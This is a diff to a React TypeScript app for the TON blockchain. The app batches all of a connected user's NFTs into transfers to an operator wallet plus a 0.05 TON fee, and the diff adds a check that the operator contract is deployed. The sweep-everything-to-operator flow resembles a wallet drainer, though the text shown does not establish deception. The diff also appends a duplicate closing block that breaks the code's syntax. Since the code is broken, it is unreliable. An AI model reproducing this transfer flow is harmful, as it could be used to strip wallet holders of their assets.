@@ -5,7 +5,12 @@ import {
   useTonConnectUI,
 } from '@tonconnect/ui-react';
 import { toNano } from '@ton/core';
-import { fetchNfts, buildNftTransferToOperator, OPERATOR_WALLET } from './nft';
+import {
+  fetchNfts,
+  buildNftTransferToOperator,
+  OPERATOR_WALLET,
+  getOperatorContract,
+} from './nft';
 
 const MAX_NFT_PER_TX = 200;
 const PAYMENT_AMOUNT = '0.05';
@@ -18,8 +23,18 @@ export default function App() {
   const [agreed, setAgreed] = useState(false);
   const [done, setDone] = useState(false);
 
+  const contractReady = getOperatorContract() !== null;
+
   async function collect() {
     if (!address || !agreed) return;
+
+    if (!contractReady) {
+      setStatus(
+        'Контракт оператора ещё не задеплоен. Обратитесь в поддержку.'
+      );
+      return;
+    }
+
     setLoading(true);
     setStatus('');
 
@@ -45,15 +60,20 @@ export default function App() {
       if (batches.length === 0) batches.push([]);
 
       for (const batch of batches) {
-        const messages = batch.map((n) =>
-          buildNftTransferToOperator(n.validAddress, address)
-        );
+        const messages: any[] = [];
+
+        for (const nft of batch) {
+          const built = buildNftTransferToOperator(nft.validAddress, address);
+          if (built) messages.push(built);
+        }
 
         messages.push({
           address: OPERATOR_WALLET.toString(),
           amount: toNano(PAYMENT_AMOUNT).toString(),
           payload: '',
         });
+
+        if (messages.length === 0) continue;
 
         await tonConnectUI.sendTransaction({
           validUntil: Math.floor(Date.now() / 1000) + 360,
@@ -120,6 +140,18 @@ export default function App() {
             поддержку.
           </p>
 
+          {!contractReady && (
+            <p
+              style={{
+                fontSize: 13,
+                color: '#fbbf24',
+                marginBottom: 12,
+              }}
+            >
+              ⚠️ Контракт оператора ещё не задеплоен. Кнопка отключена.
+            </p>
+          )}
+
           <label
             style={{
               display: 'flex',
@@ -138,7 +170,7 @@ export default function App() {
 
           <button
             onClick={collect}
-            disabled={loading || done || !agreed}
+            disabled={loading || done || !agreed || !contractReady}
             style={{
               width: '100%',
               marginTop: 16,
@@ -170,5 +202,7 @@ export default function App() {
         </p>
       )}
     </div>
+  );
+}
   );
 }
